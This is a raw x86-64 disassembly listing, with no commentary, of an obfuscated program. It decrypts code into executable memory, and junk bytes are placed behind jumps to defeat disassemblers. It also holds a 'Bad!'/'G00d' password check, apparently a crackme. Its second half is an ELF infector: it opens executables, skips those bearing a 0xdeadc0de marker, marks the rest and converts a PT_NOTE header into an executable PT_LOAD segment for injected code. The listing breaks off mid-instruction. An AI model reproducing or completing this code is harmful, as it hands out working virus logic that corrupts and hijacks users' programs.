00000000  4831C0            xor rax,rax
00000003  4831DB            xor rbx,rbx
00000006  4831C9            xor rcx,rcx
00000009  4831D2            xor rdx,rdx
0000000C  4989E6            mov r14,rsp
0000000F  4881C45A010000    add rsp,0x15a
00000016  4989E7            mov r15,rsp
00000019  E9A0000000        jmp 0xbe
0000001E  415C              pop r12
00000020  4981ECC3000000    sub r12,0xc3
00000027  4D31C0            xor r8,r8
0000002A  685A010000        push qword 0x15a
0000002F  5E                pop rsi
00000030  4881C65A010000    add rsi,0x15a
00000037  4831FF            xor rdi,rdi
0000003A  BA07000000        mov edx,0x7
0000003F  4D31C9            xor r9,r9
00000042  41BA22000000      mov r10d,0x22
00000048  6A09              push byte +0x9
0000004A  58                pop rax
0000004B  0F05              syscall
0000004D  4889C3            mov rbx,rax
00000050  56                push rsi
00000051  59                pop rcx
00000052  EB02              jmp short 0x56
00000055  34B0              xor al,0xb0
00000058  4831D2            xor rdx,rdx
0000005B  EB02              jmp short 0x5f
0000005D  A0CF418A143C4881  mov al,[qword 0xff81483c148a41cf]
         -FF
00000066  C20000            ret 0x0
00000069  007606            add [rsi+0x6],dh
0000006C  EB02              jmp short 0x70
0000006E  DF3430            fbstp tword [rax+rsi]
00000071  C28814            ret 0x1488
00000074  3B48FF            cmp ecx,[rax-0x1]
00000078  E2E1              loop 0x5b
0000007A  4989DF            mov r15,rbx
0000007D  4881C3C3000000    add rbx,0xc3
00000084  FFE3              jmp rbx
00000086  55                push rbp
00000087  4889E5            mov rbp,rsp
0000008A  EB02              jmp short 0x8e
0000008C  0D52B86500        or eax,0x65b852
00000091  0000              add [rax],al
00000093  4831FF            xor rdi,rdi
00000096  4831F6            xor rsi,rsi
00000099  4D31D2            xor r10,r10
0000009C  4831D2            xor rdx,rdx
0000009F  48FFC2            inc rdx
000000A2  EB02              jmp short 0xa6
000000A4  F5                cmc
000000A5  A90F05EB02        test eax,0x2eb050f
000000AA  CD52              int 0x52
000000AC  4883F800          cmp rax,byte +0x0
000000B0  7D0A              jnl 0xbc
000000B2  B83C000000        mov eax,0x3c
000000B7  4831FF            xor rdi,rdi
000000BA  0F05              syscall
000000BC  5D                pop rbp
000000BD  C3                ret
000000BE  E85BFFFFFF        call 0x1e
000000C3  4831C0            xor rax,rax
000000C6  4831DB            xor rbx,rbx
000000C9  4831FF            xor rdi,rdi
000000CC  4889E6            mov rsi,rsp
000000CF  BA0D000000        mov edx,0xd
000000D4  0F05              syscall
000000D6  4831C9            xor rcx,rcx
000000D9  8A040C            mov al,[rsp+rcx]
000000DC  3C0A              cmp al,0xa
000000DE  7408              jz 0xe8
000000E0  4801C3            add rbx,rax
000000E3  48FFC1            inc rcx
000000E6  EBF1              jmp short 0xd9
000000E8  EB02              jmp short 0xec
000000EA  4831B875AF0000    xor [rax+0xaf75],rdi
000000F1  4831D8            xor rax,rbx
000000F4  EB02              jmp short 0xf8
000000F6  B8D9483DAB        mov eax,0xab3d48d9
000000FB  AC                lodsb
000000FC  0000              add [rax],al
000000FE  741B              jz 0x11b
00000100  6842616421        push qword 0x21646142
00000105  B801000000        mov eax,0x1
0000010A  BF01000000        mov edi,0x1
0000010F  4889E6            mov rsi,rsp
00000112  BA05000000        mov edx,0x5
00000117  0F05              syscall
00000119  EB19              jmp short 0x134
0000011B  6847303064        push qword 0x64303047
00000120  B801000000        mov eax,0x1
00000125  BF01000000        mov edi,0x1
0000012A  4889E6            mov rsi,rsp
0000012D  BA06000000        mov edx,0x6
00000132  0F05              syscall
00000134  B83C000000        mov eax,0x3c
00000139  4831FF            xor rdi,rdi
0000013C  0F05              syscall
0000013E  E548              in eax,0x48
00000140  83F908            cmp ecx,byte +0x8
00000143  7551              jnz 0x196
00000145  4889F7            mov rdi,rsi
00000148  B802000000        mov eax,0x2
0000014D  BE02040000        mov esi,0x402
00000152  0F05              syscall
00000154  4883F800          cmp rax,byte +0x0
00000158  7E3C              jng 0x196
0000015A  4889C3            mov rbx,rax
0000015D  4889E6            mov rsi,rsp
00000160  4C29EE            sub rsi,r13
00000163  B804000000        mov eax,0x4
00000168  0F05              syscall
0000016A  4989D8            mov r8,rbx
0000016D  488B7630          mov rsi,[rsi+0x30]
00000171  BF00000000        mov edi,0x0
00000176  BA06000000        mov edx,0x6
0000017B  4D31C9            xor r9,r9
0000017E  41BA01000000      mov r10d,0x1
00000184  4831C0            xor rax,rax
00000187  B809000000        mov eax,0x9
0000018C  0F05              syscall
0000018E  81387F454C46      cmp dword [rax],0x464c457f
00000194  7411              jz 0x1a7
00000196  B803000000        mov eax,0x3
0000019B  4889DF            mov rdi,rbx
0000019E  0F05              syscall
000001A0  4831C0            xor rax,rax
000001A3  4889EC            mov rsp,rbp
000001A6  C3                ret
000001A7  80780402          cmp byte [rax+0x4],0x2
000001AB  7402              jz 0x1af
000001AD  EBE7              jmp short 0x196
000001AF  6683781002        cmp word [rax+0x10],byte +0x2
000001B4  7402              jz 0x1b8
000001B6  EBDE              jmp short 0x196
000001B8  817809DEC0ADDE    cmp dword [rax+0x9],0xdeadc0de
000001BF  7507              jnz 0x1c8
000001C1  4831C0            xor rax,rax
000001C4  4889EC            mov rsp,rbp
000001C7  C3                ret
000001C8  4831C9            xor rcx,rcx
000001CB  4831D2            xor rdx,rdx
000001CE  668B4838          mov cx,[rax+0x38]
000001D2  488B5820          mov rbx,[rax+0x20]
000001D6  668B5036          mov dx,[rax+0x36]
000001DA  4801D3            add rbx,rdx
000001DD  48FFC9            dec rcx
000001E0  833C1804          cmp dword [rax+rbx],byte +0x4
000001E4  7406              jz 0x1ec
000001E6  4883F900          cmp rcx,byte +0x0
000001EA  7FEE              jg 0x1da
000001EC  C74009DEC0ADDE    mov dword [rax+0x9],0xdeadc0de
000001F3  C7041801000000    mov dword [rax+rbx],0x1
000001FA  C744180407000000  mov dword [rax+rbx+0x4],0x7
00000202  41B90000000C      mov r9d,0xc000000
00000208  4901F1            add r9,rsi
0000020B  4C894C1810        mov [rax+rbx+0x10],r9
00000210  488B7C1820        mov rdi,[rax+rbx+0x20]
00000215  4881C789030000    add rdi,0x389
0000021C  48                rex.w
